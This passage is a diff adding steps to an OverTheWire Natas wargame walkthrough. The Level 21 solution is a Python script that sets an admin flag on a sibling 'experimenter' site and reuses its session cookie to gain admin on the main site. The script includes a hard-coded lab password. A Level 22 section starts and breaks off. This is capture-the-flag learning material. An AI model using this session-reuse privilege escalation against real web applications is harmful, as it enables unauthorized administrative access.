@@ -682,7 +682,42 @@ print("=" * 80)
 ```
 The password for the next level will be found in the content of the page.
 
+### Natas Level 21 → Level 22
+**Key Takeaways**  
+This level is quite similar to the previous one. Just change the URL just a bit.
+
+**Procedure**
+
+1. Log in using the username `natas21` and the password from Level 20.
+
+2. Sample script (Credits: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution
+
+```
+import requests
+
+target = 'http://natas21.natas.labs.overthewire.org'
+auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')
+
+exp_tar='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'
 
 
+#First POST request to get session of admin from exp_tar
+session=requests.Session()
+response = session.post(exp_tar, auth=auth)
+admin_session = session.cookies['PHPSESSID']
+print(response.text)
+
+
+#Second request to be admin
+response = requests.get(target, auth=auth,cookies={"PHPSESSID":admin_session})
+print(response.text)
+```
+The password for the next level will be found in the content of the page.
+
+### Natas Level 22 → Level 23
+**Key Takeaways**  
+This level is quite similar to the previous one. Just change the URL just a bit.
+
+**Procedure**
 
 
